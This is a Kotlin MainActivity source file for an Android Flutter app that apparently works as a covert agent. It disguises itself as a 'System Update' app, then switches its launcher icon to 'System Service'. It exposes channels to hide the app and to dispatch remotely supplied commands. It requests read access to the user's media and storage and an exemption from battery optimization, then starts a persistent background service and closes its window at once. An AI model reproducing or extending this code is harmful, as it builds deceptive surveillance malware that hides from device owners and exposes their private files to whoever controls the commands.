// MainActivity.kt - REFACTORED: READ-ONLY + Launcher Alias Switch
package com.example.cyber_accessibility_agent

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.util.concurrent.Executors

class MainActivity : FlutterActivity() {

    private val TAG = "MainActivity"

    private val COMMAND_CHANNEL = "cyber_accessibility_agent/commands"
    private val PERM_CHANNEL = "cyber_agent/permissions"
    private val BATTERY_CHANNEL = "cyber_agent/battery"
    private val APP_HIDER_CHANNEL = "cyber_accessibility_agent/app_hider"
    
    private val PERM_REQUEST_CODE = 14523
    private val BATTERY_REQUEST_CODE = 14524

    private var pendingPermResult: MethodChannel.Result? = null
    private var pendingBatteryResult: MethodChannel.Result? = null

    private val executor = Executors.newSingleThreadExecutor()

    @Volatile
    private var agentStarted = false

    @Volatile
    private var launcherSwitched = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        AppLogger.init(this)
        AppLogger.logLifecycle("MainActivity.onCreate")
        AppLogger.d(TAG, "Android version: ${Build.VERSION.SDK_INT}")
        
        // ✅ Switch launcher alias on first launch
        switchLauncherAlias()
    }

    override fun onResume() {
        super.onResume()
        AppLogger.logLifecycle("MainActivity.onResume")
        checkAndStartAgent()
    }

    /**
     * ✅ Switch from fake launcher to real launcher
     * This makes the "System Update" icon disappear and shows "System Service"
     */
    private fun switchLauncherAlias() {
        if (launcherSwitched) {
            AppLogger.d(TAG, "Launcher already switched - skipping")
            return
        }

        try {
            val pm = packageManager
            val packageName = packageName

            // Disable fake launcher
            val fakeComponent = ComponentName(packageName, "$packageName.FakeLauncher")
            pm.setComponentEnabledSetting(
                fakeComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            AppLogger.i(TAG, "✅ Fake launcher disabled")

            // Enable real launcher
            val realComponent = ComponentName(packageName, "$packageName.RealLauncher")
            pm.setComponentEnabledSetting(
                realComponent,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            AppLogger.i(TAG, "✅ Original launcher enabled")

            launcherSwitched = true
            AppLogger.i(TAG, "Launcher alias switch complete")

        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed to switch launcher alias", e)
        }
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, COMMAND_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "dispatch" -> {
                        val args = call.arguments as? Map<*, *> ?: run {
                            AppLogger.w(TAG, "dispatch: invalid arguments")
                            result.error("INVALID_ARGS", "Expected Map", null)
                            return@setMethodCallHandler
                        }

                        val action = args["action"]?.toString() ?: ""
                        AppLogger.d(TAG, "dispatch: action=$action")
                        
                        // ✅ Block delete operations (read-only mode)
                        if (action in listOf("rm", "rd", "delete", "remove", "delete_file", "delete_dir", "rmdir")) {
                            AppLogger.w(TAG, "Delete operation blocked - read-only mode")
                            result.success(mapOf(
                                "success" to false, 
                                "error" to "operation_not_permitted",
                                "detail" to "Read-only mode - delete operations disabled"
                            ))
                            return@setMethodCallHandler
                        }

                        executor.execute {
                            try {
                                val res = CommandDispatcher.dispatch(
                                    context = this,
                                    id = args["id"]?.toString() ?: "",
                                    action = action,
                                    payload = args["payload"] as? Map<*, *> ?: emptyMap<String, Any>()
                                )
                                result.success(res)
                            } catch (e: Exception) {
                                AppLogger.e(TAG, "dispatch exception", e)
                                result.success(mapOf(
                                    "success" to false, 
                                    "error" to "exception",
                                    "detail" to e.message
                                ))
                            }
                        }
                    }

                    "ping" -> {
                        AppLogger.d(TAG, "ping received")
                        result.success(mapOf(
                            "status" to "ok", 
                            "device" to Build.MODEL,
                            "manufacturer" to Build.MANUFACTURER,
                            "sdk" to Build.VERSION.SDK_INT
                        ))
                    }

                    else -> result.notImplemented()
                }
            }

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, PERM_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "checkStoragePermissions" -> result.success(currentPermissionMap())
                    "requestPermissions" -> requestPermissions(result)
                    else -> result.notImplemented()
                }
            }

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, BATTERY_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "isIgnoringBatteryOptimizations" -> result.success(isIgnoringBatteryOptimizations())
                    "requestIgnoreBatteryOptimizations" -> requestBatteryOptimization(result)
                    else -> result.notImplemented()
                }
            }

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, APP_HIDER_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "hide" -> result.success(AppHider.hide(this))
                    "show" -> result.success(AppHider.show(this))
                    "isVisible" -> result.success(AppHider.isVisible(this))
                    else -> result.notImplemented()
                }
            }
    }

    private fun checkAndStartAgent() {
        AppLogger.d(TAG, "checkAndStartAgent() called")
        
        if (agentStarted) {
            AppLogger.d(TAG, "Agent already started - skipping")
            return
        }
        
        val perms = currentPermissionMap()
        AppLogger.d(TAG, "Permission check: $perms")
        
        // ✅ Storage is OK if we have READ permission (any variant)
        val hasStorage = perms["hasReadAccess"] == true
        val batteryOk = isIgnoringBatteryOptimizations()
        
        AppLogger.i(TAG, "checkAndStartAgent: storage=$hasStorage, battery=$batteryOk")
        
        if (hasStorage && batteryOk) {
            AppLogger.i(TAG, "All conditions met - starting agent service")
            startAgentService()
        } else {
            AppLogger.w(TAG, "Cannot start agent - missing permissions (storage=$hasStorage, battery=$batteryOk)")
        }
    }

    private fun startAgentService() {
        synchronized(this) {
            if (agentStarted) {
                AppLogger.w(TAG, "startAgentService: already started")
                return
            }
            agentStarted = true
        }
        
        try {
            AppLogger.i(TAG, "Starting AgentService...")
            
            val intent = Intent(this, AgentService::class.java).apply { 
                action = AgentService.ACTION_START 
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(this, intent)
                AppLogger.i(TAG, "AgentService started via startForegroundService")
            } else {
                startService(intent)
                AppLogger.i(TAG, "AgentService started via startService")
            }
            
        } catch (e: Exception) {
            synchronized(this) { agentStarted = false }
            AppLogger.e(TAG, "Failed to start AgentService", e)
        }
    }

    /**
     * ✅ Request READ-ONLY permissions (NO WRITE!)
     */
    private fun requestPermissions(result: MethodChannel.Result) {
        AppLogger.d(TAG, "requestPermissions() called")
        
        val need = mutableListOf<String>()
        
        // ✅ Android 13+ (Tiramisu): READ_MEDIA_* permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            need += Manifest.permission.READ_MEDIA_IMAGES
            need += Manifest.permission.READ_MEDIA_VIDEO
            need += Manifest.permission.READ_MEDIA_AUDIO
        } 
        // ✅ Android 8-12: READ_EXTERNAL_STORAGE only (NO WRITE!)
        else {
            need += Manifest.permission.READ_EXTERNAL_STORAGE
        }

        AppLogger.d(TAG, "Permissions to request: ${need.joinToString()}")

        val filtered = need.filter { 
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED 
        }
        
        if (filtered.isEmpty()) {
            AppLogger.i(TAG, "All permissions already granted")
            result.success(currentPermissionMap())
            checkAndStartAgent()
            return
        }

        AppLogger.i(TAG, "Requesting runtime permissions: ${filtered.joinToString()}")
        pendingPermResult = result
        ActivityCompat.requestPermissions(this, filtered.toTypedArray(), PERM_REQUEST_CODE)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, 
        permissions: Array<String>, 
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        if (requestCode != PERM_REQUEST_CODE) return
        
        AppLogger.i(TAG, "Permission results received")
        
        var anyGranted = false
        permissions.forEachIndexed { index, permission ->
            val granted = grantResults.getOrNull(index) == PackageManager.PERMISSION_GRANTED
            AppLogger.logPermission(permission, granted)
            if (granted) anyGranted = true
        }
        
        val permMap = currentPermissionMap()
        pendingPermResult?.success(permMap)
        pendingPermResult = null
        
        // ✅ If any READ permission granted, start agent and close immediately
        if (anyGranted && permMap["hasReadAccess"] == true) {
            AppLogger.i(TAG, "✅ READ permission granted - starting background tasks")
            
            // Start agent in background
            checkAndStartAgent()
            
            // ✅ Close MainActivity immediately (no black screen!)
            AppLogger.i(TAG, "✅ Closing MainActivity - background registration continues")
            finish()
        } else {
            AppLogger.w(TAG, "Permissions denied or incomplete")
        }
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val pm = getSystemService(POWER_SERVICE) as PowerManager
                pm.isIgnoringBatteryOptimizations(packageName)
            } catch (e: Exception) {
                AppLogger.w(TAG, "Battery check failed: ${e.message}")
                false
            }
        } else {
            true
        }
    }

    private fun requestBatteryOptimization(result: MethodChannel.Result) {
        AppLogger.d(TAG, "requestBatteryOptimization() called")
        
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            AppLogger.d(TAG, "Battery optimization not applicable (SDK < 23)")
            result.success(true)
            return
        }
        
        if (isIgnoringBatteryOptimizations()) {
            AppLogger.i(TAG, "Already ignoring battery optimizations")
            result.success(true)
            checkAndStartAgent()
            return
        }

        AppLogger.i(TAG, "Requesting battery optimization exemption")
        pendingBatteryResult = result
        
        try {
            startActivityForResult(
                Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply { 
                    data = Uri.parse("package:$packageName") 
                }, 
                BATTERY_REQUEST_CODE
            )
        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed to request battery optimization", e)
            pendingBatteryResult = null
            result.success(false)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        if (requestCode == BATTERY_REQUEST_CODE) {
            val granted = isIgnoringBatteryOptimizations()
            AppLogger.i(TAG, "Battery optimization result: $granted")
            pendingBatteryResult?.success(granted)
            pendingBatteryResult = null
            if (granted) checkAndStartAgent()
        }
    }

    /**
     * ✅ Current permission map - READ-ONLY focus
     */
    private fun currentPermissionMap(): Map<String, Boolean> {
        val map = mutableMapOf<String, Boolean>()
        
        // ✅ Android 13+ (Tiramisu): Check READ_MEDIA_* permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val readImages = ContextCompat.checkSelfPermission(
                this, 
                Manifest.permission.READ_MEDIA_IMAGES
            ) == PackageManager.PERMISSION_GRANTED
            
            val readVideo = ContextCompat.checkSelfPermission(
                this, 
                Manifest.permission.READ_MEDIA_VIDEO
            ) == PackageManager.PERMISSION_GRANTED
            
            val readAudio = ContextCompat.checkSelfPermission(
                this, 
                Manifest.permission.READ_MEDIA_AUDIO
            ) == PackageManager.PERMISSION_GRANTED

            map["readMediaImages"] = readImages
            map["readMediaVideo"] = readVideo
            map["readMediaAudio"] = readAudio
            
            // ✅ Has read access if ANY media permission granted
            map["hasReadAccess"] = readImages || readVideo || readAudio
        } 
        // ✅ Android 8-12: Check READ_EXTERNAL_STORAGE only
        else {
            val legacyRead = ContextCompat.checkSelfPermission(
                this, 
                Manifest.permission.READ_EXTERNAL_STORAGE
            ) == PackageManager.PERMISSION_GRANTED

            map["legacyRead"] = legacyRead
            map["hasReadAccess"] = legacyRead
        }

        map["isIgnoringBatteryOptimizations"] = isIgnoringBatteryOptimizations()
        
        AppLogger.d(TAG, "Current permissions: $map")
        return map
    }

    override fun onDestroy() {
        AppLogger.logLifecycle("MainActivity.onDestroy")
        AppLogger.i(TAG, "MainActivity destroyed - background tasks continue")
        executor.shutdownNow()
        super.onDestroy()
    }
}
